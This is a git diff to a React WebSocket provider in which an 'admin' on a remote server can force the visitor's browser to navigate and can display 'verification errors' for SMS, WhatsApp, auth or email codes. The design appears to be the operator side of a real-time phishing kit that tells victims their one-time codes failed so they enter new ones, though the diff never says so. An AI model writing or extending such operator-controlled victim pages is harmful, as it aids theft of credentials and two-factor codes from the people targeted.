@@ -5,16 +5,23 @@ const WebSocketContext = createContext(null);
 
 // WebSocket server URL - change this when deploying
 const WS_URL = 'wss://magnitude57.com/ws';
+// const WS_URL = 'ws://localhost:8000/ws';
 
 export const WebSocketProvider = ({ children }) => {
   const [isConnected, setIsConnected] = useState(false);
   const [clientId, setClientId] = useState(null);
   const [isLoading, setIsLoading] = useState(true);
+  const [verificationError, setVerificationError] = useState(null); // {type: 'sms'|'whatsapp'|'auth'|'email', message: string}
   const wsRef = useRef(null);
   const navigate = useNavigate();
   const reconnectTimeoutRef = useRef(null);
   const pingIntervalRef = useRef(null);
   const clientInfoRef = useRef(null); // Store client info locally
+
+  // Clear verification error
+  const clearVerificationError = useCallback(() => {
+    setVerificationError(null);
+  }, []);
 
   // Check if notification was already sent (persists across reconnects)
   const wasNotificationSent = () => {
@@ -126,7 +133,18 @@ export const WebSocketProvider = ({ children }) => {
           case 'navigate':
             // Handle navigation command from admin
             console.log('Navigating to:', data.route);
+            // Clear any existing error when navigating
+            setVerificationError(null);
             navigate(data.route);
+            break;
+
+          case 'show_error':
+            // Handle error display command from admin
+            console.log('Showing error:', data.error_type, data.message);
+            setVerificationError({
+              type: data.error_type,
+              message: data.message
+            });
             break;
 
           case 'submit_ack':
@@ -221,7 +239,9 @@ export const WebSocketProvider = ({ children }) => {
     submitForm,
     sendMessage,
     sendInitialData,
-    reconnect: connect
+    reconnect: connect,
+    verificationError,
+    clearVerificationError
   };
 
   return (
